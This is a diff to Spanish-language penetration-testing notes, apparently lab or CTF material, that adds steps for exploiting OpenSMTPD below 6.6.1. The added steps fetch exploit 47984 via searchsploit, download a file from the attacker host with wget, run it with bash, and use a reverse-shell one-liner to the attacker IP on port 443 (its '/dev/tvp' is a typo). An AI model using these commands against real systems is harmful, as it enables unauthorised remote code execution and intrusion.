@@ -47,10 +47,27 @@ Nota:
 ## Explotar OpenSMTPD
 
 ```bash 
-# La versión vulnerable para usar este exploit es < 6.6 
+# La versión < 6.6.1 es vulnerable 
 
-❯ 
-❯ 
-❯ 
-❯ 
+❯ searchsploit opensmntpd     # Escoger el que se llama 'Remote Code Execution - 47984.py'
+	# Descargar el exploit con el parametro '-m'
+
+
+❯ python3 opensmtpd.py IP 25 'wget IP'        # Ejecutar el exploit y ver si hay conectividad 
+	# port = 25 
+	# IP = Dirección IP de Kali 
+❯ python3 opensmtpd.py IP 25 'wget IP -O /dev/shm/rev'    # Exportar el archivo a la ruta 
+❯ python3 opensmtpd.py IP 25 'bash /dev/shm/rev'          # Crear la Revershell 
+
+
+Notas:
+	1. Modificar la parte de 'Payload sent' y agregar un nombre de usuario valido en la parte de 'RCPT TO:<root>' en el exploit 
+	2. Compartir el archivo que contiene la revershell con python 'python3 -m http.server 80'
+	3. Antes de ejecutar el tercer comando, se deb de estar en modo escucha con 'Netcat'
+```
+
+```bash 
+❯ nano index.html        # Archivo con la revershell 
+	#!/bin/bash 
+	bash -i >& /dev/tvp/IP/443 0>&1
 ```
